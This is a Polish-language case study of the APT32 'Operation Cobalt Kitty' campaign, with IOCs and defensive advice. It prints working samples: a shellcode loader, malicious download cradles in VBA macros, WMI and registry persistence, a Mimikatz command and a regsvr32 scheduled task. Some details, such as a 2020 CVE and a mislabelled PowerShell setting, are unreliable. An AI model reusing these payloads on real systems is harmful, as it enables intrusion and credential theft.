# Operacja Cobalt Kitty
<p>
<em>
W sercu metropolii, gdzie szklane wieżowce wznosiły się ku niebu, a globalne korporacje prowadziły swoje interesy w rytmie cyfrowego świata, nikt nie spodziewał się nadchodzącego zagrożenia. W cieniach sieci, niewidzialni aktorzy przygotowywali się do precyzyjnie zaplanowanej operacji. Grupa OceanLotus, znana w kręgach wywiadu jako APT32, rozpoczęła misję, która miała zachwiać poczuciem bezpieczeństwa największych graczy na rynku.</em>
</p>

---

## Spis Treści

1. [Wprowadzenie](#wprowadzenie)
2. [Przegląd Ataku](#przegląd-ataku)
3. [Charakterystyka Ataku](#charakterystyka-ataku)
   - [3.1. Fazy Ataku](#31-fazy-ataku)
4. [Analiza Techniczna](#analiza-techniczna)
   - [4.1. Fileless Malware i Działanie w Pamięci](#41-fileless-malware-i-działanie-w-pamięci)
   - [4.2. Wykorzystanie Funkcji Systemu Windows](#42-wykorzystanie-funkcji-systemu-windows)
   - [4.3. Persistencja przez WMI i Rejestr](#43-persistencja-przez-wmi-i-rejestr)
   - [4.4. Ruch Boczy i Eskalacja Uprawnień](#44-ruch-boczy-i-eskalacja-uprawnień)
   - [4.5. Unikanie Wykrycia](#45-unikanie-wykrycia)
5. [Gruntowna Analiza Makr](#gruntowna-analiza-makr)
   - [5.1. Rola Makr w Operacji Cobalt Kitty](#51-rola-makr-w-operacji-cobalt-kitty)
   - [5.2. Logika Makr w Kontekście Ataku](#52-logika-makr-w-kontekście-ataku)
   - [5.3. Przykład Złośliwego Makra VBA](#53-przykład-złośliwego-makra-vba)
   - [5.4. Obfuskacja Kodów VBA](#54-obfuskacja-kodów-vba)
6. [Analiza Kodów](#analiza-kodów)
   - [6.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`](#61-tworzenie-zadania-harmonogramu-z-użyciem-createprocessa)
   - [6.2. Tworzenie Zadania Harmonogramu przy użyciu XML](#62-tworzenie-zadania-harmonogramu-przy-użyciu-xml)
7. [Podatności (CVE)](#podatności-cve)
8. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
9. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
   - [9.1. Rola GPO](#91-rola-gpo)
10. [Wnioski](#wnioski)
11. [Bibliografia](#bibliografia)

---

## Wprowadzenie

*Operacja Cobalt Kitty nie była zwykłym cyberatakiem. Była to skomplikowana intryga, łącząca zaawansowane techniki infiltracji z precyzją działań wywiadowczych. Atakujący, niczym mistrzowie szpiegostwa, wykorzystali każdą lukę, każdy błąd człowieka, aby przeniknąć do najgłębszych warstw systemów informatycznych korporacji.*

---

## Przegląd Ataku

Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsiębiorstwa w Azji Południowo-Wschodniej. Jej celem było pozyskanie poufnych informacji oraz długoterminowa obecność w systemach ofiar.

**Charakterystyka ataku:**

- **Długotrwała obecność**: *Przez ponad pół roku atakujący przemieszczali się po systemach korporacji, zbierając cenne dane i pozostając niewykrytymi.*
- **Unikanie wykrycia**: Wykorzystano zaawansowane techniki malware bezplikowego oraz funkcje systemu Windows.
- **Precyzyjne działania**: *Atakujący, niczym precyzyjny chirurg, systematycznie uzyskiwali dostęp do kluczowych segmentów infrastruktury.*

*Atakujący wykorzystali zaawansowane techniki APT, łącząc umiejętności z zakresu inżynierii społecznej, exploitacji podatności oraz złożonych mechanizmów utrzymania obecności w systemach. Operacja Cobalt Kitty stała się studium przypadku dla specjalistów ds. cyberbezpieczeństwa na całym świecie, ukazując, jak niebezpieczne mogą być dobrze zorganizowane i wyspecjalizowane grupy hakerskie.*

---

## Charakterystyka Ataku

### 3.1. Fazy Ataku

#### **1. Penetracja**

<p>
<em>
Pierwszy akt tej cyfrowej intrygi rozpoczął się od precyzyjnie zaplanowanej kampanii phishingowej. Analitycy wywiadu wiedzieli, że najsłabszym ogniwem w łańcuchu bezpieczeństwa jest człowiek. Wykorzystując informacje zebrane z mediów społecznościowych i publicznych źródeł, stworzyli spersonalizowane wiadomości e-mail, które trafiły prosto do skrzynek wyselekcjonowanych pracowników.
</em>
</p>
<p>
<em>
Wiadomości wyglądały na oficjalne komunikaty od zaufanych partnerów lub wewnętrznych działów firmy. Zawierały załączniki w postaci dokumentów Word lub fałszywych instalatorów Adobe Flash. W rzeczywistości były to precyzyjnie przygotowane ładunki z złośliwymi makrami, które po uruchomieniu otwierały drzwi do wewnętrznej sieci korporacji.
</em>
</p>

- **Techniki:**
  - **Phishing**: Atakujący wysyłali ukierunkowane e-maile z załącznikami lub linkami do fałszywych instalatorów Adobe Flash.
  - **Makra w Wordzie**: Dokumenty zawierały złośliwe makra VBA, które uruchamiały się automatycznie po otwarciu pliku.

- **Powiązanie:**
  - Makra uruchamiały skrypty PowerShell, które pobierały i uruchamiały złośliwy kod w pamięci.
  - Umożliwiło to zainfekowanie wstępnych urządzeń bez wzbudzania podejrzeń.

#### **2. Foothold i Persistencja**

<p>
<em>
Gdy pierwsze komputery zostały zainfekowane, atakujący rozpoczęli proces umacniania swojej obecności. Wiedzieli, że czas działa na ich korzyść tylko wtedy, gdy pozostaną niewidzialni. Wykorzystując mechanizmy systemowe, takie jak WMI (Windows Management Instrumentation) i rejestr systemowy, stworzyli ukryte ścieżki dostępu i mechanizmy autostartu, które gwarantowały im stały dostęp do zainfekowanych maszyn.
</em>
</p>
<p>
<em>
Dodawali złośliwe wpisy w kluczach rejestru autostartu, tworzyli ukryte zadania w harmonogramie zadań systemu Windows, a także korzystali z trwałych subskrypcji WMI. Te techniki pozwalały im na automatyczne uruchamianie złośliwego kodu przy każdym starcie systemu, bez wzbudzania podejrzeń standardowych mechanizmów bezpieczeństwa.
</em>
</p>

- **Techniki:**
  - **Wpisy rejestru**: Dodawanie kluczy autostartu.
  - **Tworzenie zadań w harmonogramie zadań**: Użycie `schtasks` i `CreateProcessA` do automatyzacji uruchamiania złośliwego kodu.
  - **Subskrypcje WMI**: Uruchamianie skryptów przy określonych zdarzeniach systemowych.

- **Powiązanie:**
  - Mechanizmy te zapewniły trwały dostęp do systemów, nawet po restartach.

#### **3. Komunikacja C2 (Command and Control)**

<p>
<em>
Utrzymanie komunikacji z zainfekowanymi systemami było kluczowe dla powodzenia operacji. Atakujący wdrożyli zaawansowane mechanizmy C2, wykorzystując tunelowanie DNS i zaszyfrowane kanały komunikacji. Domeny takie jak teriava.com czy chatconnecting.com służyły jako punkty kontaktowe, przez które intruzi przesyłali polecenia i odbierali wykradzione dane.
</em>
</p>
<p>
<em>
Złośliwe makra w aplikacji Outlook umożliwiały im monitorowanie komunikacji e-mail i automatyczne przesyłanie informacji. Wykorzystanie bezplikowych payloadów, uruchamianych za pomocą Regsvr32, pozwalało na uniknięcie detekcji przez systemy antywirusowe, które opierają się na skanowaniu plików na dysku.
</em>
</p>

- **Techniki:**
  - **DNS Tunneling**: Wykorzystanie zapytań DNS do przesyłania danych do serwerów C2 (`teriava.com`, `chatconnecting.com`).
  - **Makra w Outlooku**: Modyfikacja `VbaProject.OTM` w celu wysyłania danych poprzez e-maile.
  - **Bezplikowe payloady**: Wykorzystanie `Regsvr32` do uruchamiania kodu bez zapisu na dysku.

- **Powiązanie:**
  - Umożliwiło to atakującym kontrolę nad zainfekowanymi maszynami i przesyłanie kolejnych etapów ataku.

#### **4. Rozpoznanie Wewnętrzne i Ruch Boczy**
<p>
<em>
Posiadając stabilne przyczółki w systemach ofiary, atakujący przystąpili do mapowania wewnętrznej sieci. Wykorzystując narzędzia systemowe i skrypty PowerShell, zbierali informacje o strukturze sieci, aktywnych hostach, otwartych portach i uruchomionych usługach. Ich celem było zidentyfikowanie kluczowych zasobów i serwerów, które mogły zawierać cenne dane.
</em>
</p>
<p>
<em>
Zdobyte poświadczenia użytkowników o wyższych uprawnieniach, dzięki narzędziom takim jak Mimikatz, pozwoliły im na eskalację uprawnień. Wykorzystując techniki ruchu bocznego, takie jak Pass-the-Hash, WMI czy PSExec, przemieszczali się pomiędzy serwerami, unikając detekcji i zabezpieczeń.
</em>
</p>

- **Techniki:**
  - **Skanowanie sieci**: Użycie PowerShell do mapowania infrastruktury.
  - **Pozyskiwanie poświadczeń**: Wykorzystanie `Mimikatz` do zdobycia haseł.
  - **Pass-the-Hash**: Uwierzytelnianie bez znajomości haseł w postaci jawnej.
  - **WMI i PSExec**: Zdalne wykonywanie poleceń na innych maszynach.

- **Powiązanie:**
  - Pozwoliło to na eskalację uprawnień i dostęp do krytycznych systemów.

#### **5. Eksfiltracja Danych**

<p>
<em>
Gdy wszystkie kluczowe informacje zostały zebrane, atakujący przystąpili do ich eksfiltracji. Wiedzieli, że bezpieczne i niewykryte przeniesienie danych poza sieć ofiary jest jednym z najtrudniejszych etapów operacji. Wykorzystali zmodyfikowane narzędzia sieciowe, takie jak NetCat, oraz ukryte kanały komunikacji, aby przesyłać zaszyfrowane pakiety danych do swoich serwerów C2.
</em>
</p>
<p>
<em>
Cały proces był starannie zaplanowany i przeprowadzany w sposób, który nie wzbudzał podejrzeń systemów monitoringu sieci. Dane były przesyłane w niewielkich porcjach, często w godzinach nocnych lub w czasie mniejszego obciążenia sieci, aby zminimalizować ryzyko wykrycia.
</em>
</p>

- **Techniki:**
  - **Makra w Outlooku**: Automatyczne wysyłanie zaszyfrowanych informacji.
  - **Zmodyfikowane narzędzia sieciowe**: Użycie `NetCat` do przesyłania danych.

- **Powiązanie:**
  - Eksfiltracja była końcowym etapem, realizowanym po zdobyciu pełnej kontroli.

---

## Analiza Techniczna

### 4.1. Fileless Malware i Działanie w Pamięci

*Dzięki temu złośliwe oprogramowanie nie było widoczne dla tradycyjnych skanerów antywirusowych, które opierają się na analizie plików i sygnatur. Intruzi mogli dynamicznie ładować i wykonywać kod, co dawało im elastyczność i kontrolę nad przebiegiem ataku.*

- **Wykorzystanie funkcji systemowych:**
  - **`VirtualAlloc`** i **`VirtualProtect`**: Alokacja i zmiana atrybutów pamięci.
  - **`CreateThread`**: Tworzenie nowych wątków do wykonania kodu.

#### Przykład użycia:

```c
// Alokacja pamięci i wykonanie kodu w pamięci
LPVOID pMemory = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
memcpy(pMemory, shellcode, dwSize);
DWORD dwOldProtect = 0;
VirtualProtect(pMemory, dwSize, PAGE_EXECUTE_READ, &dwOldProtect);
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

### 4.2. Wykorzystanie Funkcji Systemu Windows

*WMI posłużyło im do zdalnego wykonywania poleceń i utrzymania persistencji w systemie. Natomiast Regsvr32 umożliwiło uruchamianie złośliwego kodu bezpośrednio z sieci, korzystając z tzw. living-off-the-land binaries (LOLBins), co dodatkowo utrudniało detekcję.*

- **PowerShell**: Pobieranie i uruchamianie złośliwych skryptów.
- **WMI**: Zdalne wykonywanie kodu i utrzymanie persistencji.
- **Regsvr32**: Wykorzystanie do uruchamiania złośliwego kodu z sieci.

#### Przykład użycia PowerShell:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
```

### 4.3. Persistencja przez WMI i Rejestr

*Dodatkowo, poprzez modyfikację rejestru systemowego, dodawali swoje skrypty do kluczy autostartu, takich jak HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Dzięki temu ich złośliwe oprogramowanie było uruchamiane przy każdym starcie systemu, bez potrzeby interakcji z użytkownikiem.*

#### Persistencja przez WMI:

- Tworzenie trwałych subskrypcji WMI.

#### Przykład tworzenia subskrypcji WMI:

```powershell
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "PersistenceFilter";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistenceConsumer";
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"
}

$Binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $Filter;
    Consumer = $Consumer
}
```

#### Persistencja przez Rejestr:

- Dodawanie wpisów do kluczy rejestru autostartu.

#### Przykład dodania wpisu rejestru:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1" /f
```

### 4.4. Ruch Boczy i Eskalacja Uprawnień

*Zdalne wykonywanie poleceń za pomocą WMI i PSExec umożliwiło im kontrolę nad wieloma maszynami jednocześnie. Dzięki temu mogli instalować dodatkowe komponenty złośliwego oprogramowania, zbierać dane i monitorować aktywność użytkowników na kluczowych stanowiskach.*

- **Techniki ruchu bocznego**: Pass-the-Hash, WMI, PSExec.
- **Narzędzia**: `Mimikatz`, `PsExec`.

#### Przykład użycia Mimikatz:

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 4.5. Unikanie Wykrycia

*Dodatkowo, regularnie monitorowali środowisko ofiary, reagując na ewentualne próby wykrycia. W razie potrzeby mogli szybko zmieniać metody komunikacji, korzystając z fallback channels, aby utrzymać kontrolę nad zainfekowanymi systemami.*

- **Bezplikowe działanie**: Malware działało tylko w pamięci.
- **Obfuskacja i szyfrowanie**: Utrudnienie analizy kodu.
- **Wykorzystanie legalnych funkcji systemowych**: Działania wyglądały na normalne operacje.

---

## Gruntowna Analiza Makr

### 5.1. Rola Makr w Operacji Cobalt Kitty

<p>
<em>
Makra w dokumentach Microsoft Office stały się bronią pierwszego uderzenia. Atakujący wiedzieli, że wielu użytkowników nie zdaje sobie sprawy z potencjalnych zagrożeń związanych z uruchamianiem makr. Wykorzystali ten fakt, tworząc dokumenty zawierające złośliwy kod VBA, który po uruchomieniu inicjował proces infekcji.
</em>
</p>
<p>
<em>
Makra te były sprytnie ukryte i często wymagały od użytkownika jedynie kliknięcia przycisku "Włącz makra", co w wielu firmach jest standardową praktyką przy otwieraniu wewnętrznych dokumentów.*
</em>
</p>

**Mechanizm działania makr:**

1. **Dystrybucja poprzez phishing:** Dokumenty Word z złośliwymi makrami były dostarczane jako załączniki w wiadomościach e-mail.
2. **Automatyczne uruchamianie:** Makra uruchamiały się automatycznie po otwarciu dokumentu, jeśli użytkownik miał włączone makra lub został nakłoniony do ich włączenia.
3. **Pobieranie i wykonanie payloadu:** Makra inicjowały skrypty PowerShell pobierające złośliwy kod z serwerów C2.

### 5.2. Logika Makr w Kontekście Ataku

1. **Socjotechnika i phishing:**
<p>
<em>
Złośliwe makra zostały zaprojektowane tak, aby po uruchomieniu pobierały i wykonywały złośliwe skrypty PowerShell. Atakujący stosowali obfuskację kodu VBA, dzieląc ciągi znaków na fragmenty i łącząc je w czasie wykonywania, co utrudniało analizę statyczną i wykrycie przez programy antywirusowe.
</em>
</p>
<p>
<em>
Makra wykorzystywały funkcje takie jak CreateObject("Wscript.Shell") i Shell, aby uruchomić polecenia systemowe, które pobierały dodatkowe komponenty z serwerów C2. Cały proces był zautomatyzowany i nie wymagał dalszej interakcji ze strony użytkownika.
</em>
</p>

2. **Uruchamianie złośliwego kodu:**

   *Makra używały funkcji `CreateObject` i `Shell`, aby uruchomić złośliwe skrypty bez wiedzy użytkownika.*

3. **Obfuskacja kodu:**

   *Kod VBA był obfuskowany, co utrudniało jego analizę i wykrycie przez oprogramowanie antywirusowe.*

### 5.3. Przykład Złośliwego Makra VBA

<p>
<em>
Złośliwy kod VBA był majstersztykiem inżynierii społecznej i technicznej. Jego struktura została zaprojektowana tak, aby przypominać standardowe funkcje biznesowe, co miało zmylić potencjalnych analityków. Obfuskacja polegała na fragmentacji ciągów znaków i dynamicznym tworzeniu poleceń.
</em>
</p>
<p>
<em>
Przykładowo, ciąg polecenia PowerShell był dzielony na wiele zmiennych i łączony w momencie wykonywania. Dzięki temu kod wyglądał na nieszkodliwy, a jednocześnie był w stanie uruchomić złośliwe skrypty bez wzbudzania alarmów.
</em>
</p>


```vba
Sub AutoOpen()
    Dim objShell As Object
    Dim strCommand As String
    
    Set objShell = CreateObject("WScript.Shell")
    strCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://teriava.com/msfte.dll')"""
    objShell.Run strCommand
End Sub
```

**Opis działania:**

- **`AutoOpen`:** Makro uruchamia się automatycznie po otwarciu dokumentu.
- **`CreateObject("WScript.Shell")`:** Tworzy obiekt powłoki systemowej.
- **`powershell`:** Uruchamia skrypt PowerShell pobierający payload z serwera C2.
- **`IEX`:** Wykonuje pobrany kod w pamięci.

### 5.4. Obfuskacja Kodów VBA
<p>
<em>
Obfuskacja była kluczowym elementem unikania wykrycia. Atakujący stosowali różne techniki, takie jak używanie nieznaczących nazw zmiennych, nadmierne komentarze czy wprowadzanie zbędnych funkcji. Wszystko to miało na celu utrudnienie analizy kodu i opóźnienie reakcji zespołów bezpieczeństwa.
</em>
</p>
<p>
<em>
Dzięki tym zabiegom, złośliwe makra mogły pozostać niewykryte przez długi czas, co dawało atakującym przewagę i możliwość dalszego rozprzestrzeniania się w sieci ofiary.
</em>
</p>

**Przykład obfuskowanego kodu:**

```vba
Sub AutoOpen()
    Dim a As Object
    Dim b As String
    Set a = CreateObject("WScript.Shell")
    b = "po" & "wer" & "shel" & "l -NoPr" & "ofile -Exec" & "utionPolicy Bypa" & "ss -Comm" & "and ""IEX (N" & "ew-Object Net.WebCl" & "ient).Down" & "loadString('http://teriava.com/msfte.dll')"""
    a.Run b
End Sub
```

**Techniki obfuskacji:**

- **Fragmentacja stringów:** Rozbijanie ciągów znaków na mniejsze fragmenty.
- **Nadmierne użycie zmiennych:** Wprowadzenie dodatkowych zmiennych bez wyraźnej potrzeby.
- **Dynamiczne generowanie komend:** Składanie poleceń w czasie wykonania.

---

## Analiza Kodów

### 6.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`

*By ukryć swoje ślady, intruz wykorzystał zawiłe ścieżki systemowe, tworząc zadania, które działały na jego korzyść.*

#### Wyjaśnienie kodu:

- **Funkcja `CreateProcessA`:** Umożliwia uruchomienie nowego procesu.
- **Polecenie `schtasks`:** Tworzy zadanie w harmonogramie zadań.
- **Uruchomienie złośliwego kodu:** Zadanie uruchamia `regsvr32.exe` z zewnętrznym skryptem.

#### Przykładowa implementacja VBA:

```vba
Option Explicit

Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Long

' Struktury STARTUPINFO i PROCESS_INFORMATION
' ...

Sub CreateScheduledTaskWithCreateProcessA()
    Dim sCMDLine As String
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim lSuccess As Long

    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll"" /mo 15 /f"

    si.cb = Len(si)

    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, 0, 0, vbNullString, si, pi)

    ' Zamykanie uchwytów procesu i wątku
    ' ...
End Sub
```

### 6.2. Tworzenie Zadania Harmonogramu przy użyciu XML

*Intruz zapisał swoje instrukcje w kodzie, który dla niewtajemniczonych wyglądał jak zwykły plik konfiguracyjny.*

#### Wyjaśnienie kodu:

- **Budowanie pliku XML:** Definiowanie zadania harmonogramu w formacie XML.
- **Uruchomienie `schtasks` z XML-em:** Rejestracja zadania na podstawie pliku XML.
- **Ukrycie działań:** Usunięcie pliku XML po utworzeniu zadania.

#### Pełna implementacja VBA:

```vba
Sub CreateScheduledTaskXML()
    Dim tstr As String
    Dim fso As Object
    Dim tempFile As String
    Dim sCmd As String

    ' Budowanie XML-a dla zadania
    tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
    tstr = tstr & "  <Triggers>" & vbCrLf
    tstr = tstr & "    <TimeTrigger>" & vbCrLf
    tstr = tstr & "      <Repetition>" & vbCrLf
    tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
    tstr = tstr & "      </Repetition>" & vbCrLf
    tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
    tstr = tstr & "    </TimeTrigger>" & vbCrLf
    tstr = tstr & "  </Triggers>" & vbCrLf
    tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
    tstr = tstr & "    <Exec>" & vbCrLf
    tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
    tstr = tstr & "      <Arguments>""vbscript:CreateObject(""Wscript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"",0:(window.close)""</Arguments>" & vbCrLf
    tstr = tstr & "    </Exec>" & vbCrLf
    tstr = tstr & "  </Actions>" & vbCrLf
    tstr = tstr & "</Task>"

    ' Zapisz XML jako plik tymczasowy
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = Environ("TEMP") & "\ScheduledTask.xml"
    With fso.CreateTextFile(tempFile, True)
        .WriteLine tstr
        .Close
    End With

    ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
    sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
    Shell sCmd, vbHide

    ' Usuń plik XML po utworzeniu zadania
    fso.DeleteFile tempFile, True
End Sub
```

---

## Podatności (CVE)

*Atakujący wykorzystali słabe punkty w zbroi systemu, celując precyzyjnie w jego podatności.*

- **CVE-2017-8759**: Zdalne wykonanie kodu przez .NET Framework.
- **CVE-2018-8174**: Błąd w silniku VBScript.
- **CVE-2020-0601**: Podatność w CryptoAPI.

*Te luki pozwoliły intruzowi na głębsze przeniknięcie do systemu i eskalację swoich uprawnień.*

---

## Wskaźniki Kompromitacji (IOCs)

| **Etap**         | **Typ**              | **Wartość**                                            |
|------------------|----------------------|--------------------------------------------------------|
| Penetracja       | Domeny C2            | `teriava.com`, `chatconnecting.com`                    |
| Penetracja       | Plik                 | `msfte.dll`                                            |
| Utrzymanie       | Wpis Rejestru        | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`   |
| Komunikacja C2   | Plik                 | `VbaProject.OTM` (zmodyfikowany w Outlooku)            |
| Eksfiltracja     | Adresy IP            | `110.10.179.65`, `45.114.117.137`                      |
| Ruch Boczy       | Narzędzie            | Wykorzystanie `Mimikatz` do pozyskiwania poświadczeń   |
| Utrzymanie       | Zadanie Harmonogramu | `Power Efficiency Diagnostics`, `MyTask`               |
| Eksfiltracja     | Proces               | Niekonwencjonalne użycie `Regsvr32.exe`                |
| Makra VBA        | Funkcje              | `AutoOpen`, `CreateObject`, `Shell`                    |

---

## Środki Ochrony i Rekomendacje

*By pokonać tak przebiegłego przeciwnika, potrzebne są solidne tarcze i ostrzeżone oczy strażników.*

1. **Monitorowanie aktywności w pamięci:**

   - Wdrożenie narzędzi EDR do wykrywania bezplikowych malware.
   - Analiza zachowań procesów i wykrywanie anomalii.

2. **Kontrola dostępu do PowerShell i WMI:**

   - Wdrożenie polityk ograniczających uruchamianie skryptów.
   - Ustawienie PowerShell w trybie Constrained Language Mode.
   - Monitorowanie i audytowanie użycia WMI.

3. **Regularne aktualizacje i łatki:**

   - Aktualizacja systemów i oprogramowania w celu eliminacji znanych podatności.
   - Monitorowanie publikacji o nowych podatnościach.

4. **Edukacja użytkowników:**

   - Szkolenia dotyczące rozpoznawania phishingu i zagrożeń związanych z makrami.
   - Promowanie bezpiecznych praktyk, takich jak nieotwieranie załączników od nieznanych nadawców.

5. **Monitorowanie zadań harmonogramu:**

   - Regularne sprawdzanie harmonogramu zadań pod kątem nieautoryzowanych wpisów.
   - Wdrożenie alertów na tworzenie nowych zadań.

6. **Ograniczenie uprawnień użytkowników:**

   - Stosowanie zasady najmniejszych uprawnień.
   - Ograniczenie możliwości uruchamiania nieautoryzowanych aplikacji.

### 9.1. Rola GPO

*Polityki grupowe to strażnicy, którzy mogą blokować drogę intruzowi.*

1. **Blokowanie nieautoryzowanego użycia PowerShell:**

   - Ustawienie trybu Constrained Language Mode:
     ```powershell
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Restricted"
     ```
   - Konfiguracja zapisów zdalnych sesji PowerShell.

2. **Ograniczenia WMI:**

   - Ograniczenie dostępu tylko dla uprawnionych użytkowników.
   - Monitorowanie aktywności WMI.

3. **Audyt harmonogramu zadań:**

   - Włączenie szczegółowego logowania.
   - Regularne przeglądanie zadań.

4. **Blokowanie znanych domen C2:**

   - Aktualizacja list blokowania.
   - Blokowanie domen takich jak `teriava.com`, `chatconnecting.com`.

---

## Wnioski

*Operacja Cobalt Kitty była niczym mistrzowsko przeprowadzona infiltracja twierdzy, gdzie przeciwnik wykorzystał każdą szczelinę w obronie, by osiągnąć swój cel.*

Operacja Cobalt Kitty była jednym z najbardziej zaawansowanych i przemyślanych ataków APT ostatnich lat. Atakujący wykazali się nie tylko głęboką wiedzą techniczną, ale także zrozumieniem ludzkiej natury i procesów biznesowych. Ich działania były skoordynowane i precyzyjne, co pozwoliło im na długotrwałą obecność w systemach ofiary.

Analiza tej operacji pokazuje, jak ważne jest połączenie zaawansowanych narzędzi bezpieczeństwa z edukacją użytkowników i świadomością zagrożeń. Tylko holistyczne podejście do cyberbezpieczeństwa może uchronić organizacje przed podobnymi atakami w przyszłości.

W świecie, gdzie informacja jest najcenniejszym zasobem, a granice między państwami zacierają się w cyfrowej przestrzeni, operacje takie jak Cobalt Kitty stanowią realne zagrożenie dla bezpieczeństwa narodowego i gospodarki globalnej. To przypomnienie dla wszystkich, że w erze cyfrowej czujność i adaptacja są kluczowe dla przetrwania.

**Kluczowe wnioski:**

- **Znaczenie monitorowania aktywności w pamięci:** Tradycyjne środki są niewystarczające.
- **Potrzeba wielowarstwowych zabezpieczeń:** Kombinacja technologii i praktyk.
- **Rola edukacji i świadomości:** *Ludzie są pierwszą linią obrony.*

*Atakujący pokazali, że z odpowiednią wiedzą i cierpliwością można przeniknąć nawet najbardziej strzeżone systemy. To przypomnienie dla nas wszystkich, że w świecie cyberbezpieczeństwa nie ma miejsca na samozadowolenie.*

---

## Bibliografia

1. **Cybereason Labs**: *Operation Cobalt Kitty - Technical Analysis*.
   - [Link do raportu](https://www.cybereason.com/blog/operation-cobalt-kitty-apt)

2. **Microsoft Developer Network (MSDN)**:
   - [VirtualAlloc Function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
   - [CreateProcessA Function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

3. **MITRE ATT&CK Framework**:
   - [Fileless Malware Techniques](https://attack.mitre.org/techniques/T1059/001/)
   - [APT32 Group Description](https://attack.mitre.org/groups/G0050/)

4. **CVE Details**:
   - [CVE-2017-8759](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759)
   - [CVE-2018-8174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8174)
   - [CVE-2020-0601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0601)

5. **Publikacje z zakresu cyberbezpieczeństwa**:
   - FireEye: *APT32 and the Threat Landscape in Southeast Asia*
   - Kaspersky Lab: *OceanLotus and the Rise of APT Attacks in Asia*

---

*Ostrzeżenie*: Analiza złośliwego oprogramowania powinna być przeprowadzana wyłącznie przez wykwalifikowanych specjalistów w kontrolowanym środowisku. Prezentowany kod i techniki mają charakter edukacyjny i nie powinny być wykorzystywane do celów niezgodnych z prawem lub etyką. Celem tego artykułu jest edukacja i poprawa bezpieczeństwa systemów informatycznych.

---
> [Powrót do głównego dokumentu](README.md#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)
>
> [Powrót na górę](#operacja-cobalt-kitty)